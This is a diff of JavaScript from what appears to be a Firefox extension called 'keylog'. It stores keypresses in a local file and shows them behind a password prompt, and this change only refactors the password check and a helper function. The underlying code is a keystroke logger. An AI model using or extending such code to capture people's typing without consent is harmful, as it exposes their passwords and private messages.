@@ -15,9 +15,6 @@ fff_namespace.fff=function()
 	window.addEventListener( "load", function() {fff.init(); }, false);
 };
 var keylog=new fff_namespace.fff();
-function isNumber(n) {
-  return !isNaN(parseFloat(n)) && isFinite(n);
-}
 
 keylog.logKeypress=function(e) {
 	var file = Components.classes["@mozilla.org/file/local;1"]
@@ -44,7 +41,9 @@ keylog.logKeypress=function(e) {
 }
 
 keylog.present_log=function() {
-
+	function isNumber(n) {
+		return !isNaN(parseFloat(n)) && isFinite(n);
+	}
 	//read the contents of the log file
 	var file = Components.classes["@mozilla.org/file/local;1"].createInstance(Components.interfaces.nsILocalFile);
 	file.initWithPath(keylog.f);
@@ -90,9 +89,7 @@ keylog.present_log=function() {
 	return tmp_str;
 };
 
-keylog.show_present_log=function(){
-
-
+keylog.do_auth=function() {
 	var pass="",
 		initial_pass="",
 		input_pass="",
@@ -131,10 +128,14 @@ keylog.show_present_log=function(){
 	if(input_pass!=pass)
 	   {
 		alert("Your password is wrong.  Please try again!");
-		return;
+		return false;
 	   }
+	return true;
+};
 
-
+keylog.show_present_log=function(){
+	if(!keylog.do_auth())
+		return false;
 	//not stored in history
 	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8">'
 	+'<style>'
